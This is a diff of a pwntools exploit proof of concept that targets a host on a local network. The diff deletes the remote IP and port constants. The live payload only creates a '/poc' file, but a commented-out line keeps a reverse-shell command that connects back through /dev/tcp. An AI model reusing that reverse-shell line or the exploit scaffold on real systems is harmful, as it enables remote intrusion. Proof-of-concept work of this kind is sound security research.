@@ -2,8 +2,6 @@ from pwn import *
 
 context(arch='amd64', os='linux', log_level='error')
 FLAG_VAL = 0xdeadbeef
-R_IP = b'47.240.70.54'
-R_PORT = 8000
 # CMD = b'ash -c "ash  -i>& /dev/tcp/%s/%d 0<&1" \x00' % (R_IP, R_PORT)
 CMD = b'ash -c "touch /poc" \x00'
 IP = '192.168.56.116'
